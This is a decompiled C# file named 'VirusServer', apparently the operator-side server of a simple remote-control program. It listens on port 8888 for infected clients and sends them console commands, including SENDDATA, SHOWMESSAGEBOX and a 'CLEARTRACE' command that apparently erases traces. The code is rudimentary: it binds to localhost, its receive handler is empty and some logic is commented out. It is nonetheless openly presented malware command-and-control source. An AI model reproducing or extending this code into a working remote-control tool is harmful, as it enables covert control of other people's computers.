// Decompiled with JetBrains decompiler
// Type: VirusServer.Program
// Assembly: VirusServer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6E533D8A-EF85-4E07-B13B-DAC68EEEE3DD
// Assembly location: C:\Users\daniel.shemesh\Downloads\VirusServer.exe

using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace VirusServer
{
  internal static class Program
  {
    private static IPAddress ipAd = IPAddress.Parse("127.0.0.1");
    public static TcpListener server = new TcpListener(Program.ipAd, 8888);
    public static List<TcpClient> clients = new List<TcpClient>();
    public const int port = 8888;

    public static void GetConnection()
    {
      //Thread thread = new Thread(()=>{
//while(true){
      TcpClient tcpClient = Program.server.AcceptTcpClient();
      Program.clients.Add(tcpClient);
      Console.WriteLine("CONNECTED");
      //Program.console();
//}
//});
    }

    private static void Main(string[] args)
    {
      Program.server.Start();
      Program.GetConnection();

      new Thread((ThreadStart) (() =>
      {
label_5:
        for (int index = 0; index < Program.clients.Count; ++index)
        {
          NetworkStream stream = Program.clients[index].GetStream();
          if (stream.DataAvailable)
          {
            byte[] numArray = new byte[100];
            stream.Read(numArray, 0, numArray.Length);
            Program.RecievedConsole(Encoding.Default.GetString(numArray), Program.clients[index]);
            stream.Flush();
          }
        }
        goto label_5;
      })).Start();
	Program.console();
	    
    }

    public static void RecievedConsole(string str, TcpClient client)
    {
    }

    public static void WriteData(byte[] data, TcpClient client)
    {
      client.GetStream().Write(data, 0, data.Length);
    }

    public static void console()
    {
      string[] strArray = Console.ReadLine().Split(" ".ToCharArray());
      switch (strArray[0])
      {
        case "SENDDATA":

          List<byte> list1 = new List<byte>();
          for (int index = 1; index < strArray.Length - 1; ++index)
          {
            List<byte> list2 = Enumerable.ToList<byte>((IEnumerable<byte>) Encoding.ASCII.GetBytes(strArray[index]));
            list1.AddRange((IEnumerable<byte>) list2);
          }
          int index1 = int.Parse(strArray[strArray.Length - 1]);
          Program.clients[index1].GetStream().Write(list1.ToArray(), 0, list1.Count);
          Program.console();
          break;
        case "CLEARTRACE":
          byte[] bytes = Encoding.ASCII.GetBytes(strArray[0]);
          int index2 = int.Parse(strArray[strArray.Length - 1]);
          using (NetworkStream stream = Program.clients[index2].GetStream())
            stream.Write(bytes, 0, bytes.Length);
          Program.clients.RemoveAt(index2);
          Program.console();
          break;
        case "GETCONNECTIONS":
          Program.GetConnection();
          Program.console();
          break;
        case "SHOWMESSAGEBOX":
          List<byte> list3 = new List<byte>();
          for (int index3 = 0; index3 < strArray.Length - 1; ++index3)
          {
            List<byte> list2 = Enumerable.ToList<byte>((IEnumerable<byte>) Encoding.ASCII.GetBytes(strArray[index3] + " "));
            list3.AddRange((IEnumerable<byte>) list2);
          }
          int index4 = int.Parse(strArray[strArray.Length - 1]);
          using (NetworkStream stream = Program.clients[index4].GetStream())
            stream.Write(list3.ToArray(), 0, list3.Count);
          Program.console();
          break;
        default:
          Program.console();
          break;
      }
    }
  }
}
